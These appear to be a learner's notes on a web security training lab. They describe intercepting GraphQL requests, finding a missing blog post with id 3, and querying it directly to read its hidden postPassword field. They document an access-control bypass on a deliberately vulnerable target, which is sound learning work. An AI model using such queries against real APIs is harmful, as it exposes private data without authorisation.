/*

Blog page contains a hidden blog post that has a secret password. 


InQL extension makes it easier to modify GraphQL queries in Repeater, 
and enables you to scan the API schema. 

1) Refreshing the blog page reveals some requests in proxy,

2) POST /graphql/v1 HTTP/2
   // Blog posts are retrieved using a GraphQL query.
   // reveals a blog post with id:3 is missing

3) There are two graphQL queries being used
    //  one to fetch all blogposts
    // one to fetch a specific blogpost

query {
    getAllBlogPosts {
        author
        date # Timestamp scalar
        id
        image
        isPrivate
        paragraphs
        postPassword
        summary
        title
    }
}

------------------------------------
query {
    getBlogPost(id: Int!) {
        author
        date # Timestamp scalar
        id
        image
        isPrivate
        paragraphs
        postPassword
        summary
        title
    }
}

4) send the specific one to repeater
query {
    getBlogPost(id: 3) {
        author
        date # Timestamp scalar
        id
        image
        isPrivate
        paragraphs
        postPassword
        summary
        title
    }
}

// postPassword

*/